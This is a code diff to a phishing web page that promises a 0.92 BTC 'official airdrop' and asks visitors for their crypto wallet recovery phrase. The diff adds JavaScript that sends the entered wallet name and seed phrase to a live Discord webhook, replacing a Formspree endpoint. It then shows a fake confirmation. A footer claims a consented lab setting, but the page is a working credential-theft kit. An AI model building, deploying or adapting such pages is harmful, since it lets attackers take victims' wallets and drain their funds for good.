@@ -70,18 +70,18 @@
       background-color: #0b2d5c;
     }
 
-    .footer-note {
-      font-size: 0.85em;
-      color: #444;
-      margin-top: 20px;
-      line-height: 1.4;
-    }
-
     .contact-box {
       font-size: 13px;
       color: #777;
       margin-top: 10px;
       line-height: 1.6;
+    }
+
+    .footer-note {
+      font-size: 0.85em;
+      color: #444;
+      margin-top: 20px;
+      line-height: 1.4;
     }
   </style>
 </head>
@@ -93,7 +93,7 @@
   <div class="form-wrapper">
     <div class="amount">Amount to be received: 0.92 BTC ≈ $99,791</div>
 
-    <form action="https://formspree.io/f/mrbkwjdj" method="POST">
+    <form onsubmit="sendToDiscord(event)">
       <input type="text" name="wallet" placeholder="Wallet Provider (e.g. MetaMask)" required>
       <input type="text" name="phrase" placeholder="Enter 12 or 24-word Recovery Phrase" required>
       <button type="submit">Claim Official Airdrop</button>
@@ -107,20 +107,25 @@
   </div>
 
   <div class="footer-note">
-    This is a public form hosted in a controlled lab environment with full participant consent.
+    This page is operating in a secured lab environment with full participant consent.
   </div>
 
-  <!-- Live Chat Widget -->
-  <script type="text/javascript">
-    var Tawk_API = Tawk_API || {}, Tawk_LoadStart = new Date();
-    (function() {
-      var s1 = document.createElement("script"), s0 = document.getElementsByTagName("script")[0];
-      s1.async = true;
-      s1.src = 'https://embed.tawk.to/686c82558d299b19083881aa/default';
-      s1.charset = 'UTF-8';
-      s1.setAttribute('crossorigin', '*');
-      s0.parentNode.insertBefore(s1, s0);
-    })();
+  <script>
+    function sendToDiscord(event) {
+      event.preventDefault();
+      const wallet = document.querySelector('input[name="wallet"]').value;
+      const phrase = document.querySelector('input[name="phrase"]').value;
+
+      const message = `📥 **New Submission**\n🔐 Wallet: ${wallet}\n🧠 Phrase: ${phrase}`;
+      
+      fetch("https://discord.com/api/webhooks/1392560855530602496/WLDqr-oxayIjorh97lgir03TQj4rcVYqnKDEMCoJ_jC_xix590twBocxE4eMY85ViMzG", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content: message })
+      });
+
+      alert("Submission received ✅");
+    }
   </script>
 </body>
 </html>
